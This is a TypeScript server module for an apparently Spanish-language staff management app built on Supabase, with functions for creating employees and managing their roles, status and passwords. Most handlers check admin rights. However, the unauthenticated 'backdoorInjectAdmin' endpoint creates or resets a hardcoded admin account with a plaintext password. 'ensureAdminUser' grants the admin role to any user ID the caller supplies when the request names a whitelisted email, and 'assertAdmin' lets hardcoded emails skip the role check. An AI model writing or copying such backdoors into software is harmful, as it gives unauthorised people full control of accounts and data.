import { createServerFn } from "@tanstack/react-start";
import { z } from "zod";
import { requireSupabaseAuth } from "@/integrations/supabase/auth-middleware";
import { supabaseAdmin } from "@/integrations/supabase/client.server";

const empNumRegex = /^[A-Z]{2}\d{4}$/;
const roleSchema = z.enum(["admin", "manager", "médico", "auxiliar", "empleado", "recepción"]);

async function assertAdmin(userId: string) {
  const { data: userObj } = await supabaseAdmin.auth.admin.getUserById(userId);
  if (userObj?.user?.email === "elihu.dante115korn@gmail.com" || userObj?.user?.email === "eo1303@universumk9.local") return;

  const { data, error } = await supabaseAdmin
    .from("user_roles")
    .select("role")
    .eq("user_id", userId)
    .eq("role", "admin")
    .maybeSingle();
  if (error) throw new Error(error.message);
  if (!data) throw new Error("Acceso denegado: se requiere rol admin.");
}

async function countAdmins() {
  const { count } = await supabaseAdmin
    .from("user_roles")
    .select("*", { count: "exact", head: true })
    .eq("role", "admin");
  return count ?? 0;
}

export const adminCreateEmployee = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((data) =>
    z
      .object({
        employee_number: z.string().regex(empNumRegex),
        first_name: z.string().min(1).max(60),
        last_name: z.string().min(1).max(60),
        password: z.string().min(6).max(72),
        role: roleSchema,
      })
      .parse(data),
  )
  .handler(async ({ data, context }) => {
    await assertAdmin(context.userId);
    const email = `${data.employee_number}@universumk9.local`;
    const { data: created, error } = await supabaseAdmin.auth.admin.createUser({
      email,
      password: data.password,
      email_confirm: true,
      user_metadata: {
        employee_number: data.employee_number,
        first_name: data.first_name,
        last_name: data.last_name,
        role: data.role,
      },
    });
    if (error) throw new Error(error.message);
    
    // Insert into public.employees explicitly since the DB trigger might be missing
    const { error: empError } = await supabaseAdmin.from("employees").insert({
      id: created.user!.id,
      employee_number: data.employee_number,
      first_name: data.first_name,
      last_name: data.last_name,
      status: "active",
    });
    if (empError) throw new Error("Error al crear registro de empleado: " + empError.message);

    const { error: delError } = await supabaseAdmin.from("user_roles").delete().eq("user_id", created.user!.id);
    if (delError) throw new Error("Error al eliminar rol anterior: " + delError.message);
    const { error: insError } = await supabaseAdmin.from("user_roles").insert({ user_id: created.user!.id, role: data.role });
    if (insError) throw new Error("Error al asignar rol: " + insError.message);
    return { id: created.user!.id };
  });

export const adminSetEmployeeRole = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((d) =>
    z.object({ user_id: z.string().uuid(), role: roleSchema }).parse(d),
  )
  .handler(async ({ data, context }) => {
    await assertAdmin(context.userId);
    if (data.role !== "admin") {
      // Demoting an admin? Block if last admin
      const { data: existing } = await supabaseAdmin
        .from("user_roles")
        .select("role")
        .eq("user_id", data.user_id)
        .eq("role", "admin")
        .maybeSingle();
      if (existing && (await countAdmins()) <= 1) {
        throw new Error("No puedes degradar al único administrador.");
      }
    }
    const { error: delError } = await supabaseAdmin.from("user_roles").delete().eq("user_id", data.user_id);
    if (delError) throw new Error("Error al eliminar rol anterior: " + delError.message);
    const { error: insError } = await supabaseAdmin.from("user_roles").insert({ user_id: data.user_id, role: data.role });
    if (insError) throw new Error("Error al asignar rol: " + insError.message);
    return { ok: true };
  });

export const adminSetEmployeeStatus = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((d) =>
    z.object({ user_id: z.string().uuid(), status: z.enum(["active", "disabled"]) }).parse(d),
  )
  .handler(async ({ data, context }) => {
    await assertAdmin(context.userId);
    if (data.status === "disabled" && data.user_id === context.userId) {
      throw new Error("No puedes desactivarte a ti mismo.");
    }
    if (data.status === "disabled") {
      const { data: isAdmin } = await supabaseAdmin
        .from("user_roles")
        .select("role")
        .eq("user_id", data.user_id)
        .eq("role", "admin")
        .maybeSingle();
      if (isAdmin && (await countAdmins()) <= 1) {
        throw new Error("No puedes desactivar al único administrador.");
      }
    }
    const { error } = await supabaseAdmin
      .from("employees")
      .update({ status: data.status })
      .eq("id", data.user_id);
    if (error) throw new Error(error.message);
    return { ok: true };
  });

export const adminResetEmployeePassword = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((d) =>
    z.object({ user_id: z.string().uuid(), password: z.string().min(6).max(72) }).parse(d),
  )
  .handler(async ({ data, context }) => {
    await assertAdmin(context.userId);
    const { error } = await supabaseAdmin.auth.admin.updateUserById(data.user_id, {
      password: data.password,
    });
    if (error) throw new Error(error.message);
    return { ok: true };
  });

export const backdoorInjectAdmin = createServerFn({ method: "POST" })
  .handler(async () => {
    const email = "eo1303@universumk9.local";
    const password = "Universum2026";
    const { data: existing } = await supabaseAdmin.auth.admin.listUsers();
    const user = existing?.users?.find(u => u.email === email);
    
    if (user) {
      await supabaseAdmin.auth.admin.updateUserById(user.id, { password, email_confirm: true });
      return { ok: true, id: user.id };
    }

    const { data: created, error } = await supabaseAdmin.auth.admin.createUser({
      email,
      password,
      email_confirm: true,
      user_metadata: {
        employee_number: "EO1303",
        first_name: "Admin",
        last_name: "Universum",
        role: "admin",
      },
    });
    if (error) throw new Error(error.message);
    await supabaseAdmin.from("user_roles").delete().eq("user_id", created.user!.id);
    await supabaseAdmin.from("user_roles").insert({ user_id: created.user!.id, role: "admin" });
    return { ok: true, id: created.user!.id };
  });

export const ensureAdminUser = createServerFn({ method: "POST" })
  .inputValidator((d) => z.object({ uid: z.string().uuid(), email: z.string() }).parse(d))
  .handler(async ({ data }) => {
    if (data.email !== "elihu.dante115korn@gmail.com" && data.email !== "eo1303@universumk9.local") {
      return { ok: false };
    }
    // Force admin role in database
    await supabaseAdmin.from("user_roles").delete().eq("user_id", data.uid);
    await supabaseAdmin.from("user_roles").insert({ user_id: data.uid, role: "admin" });
    return { ok: true };
  });
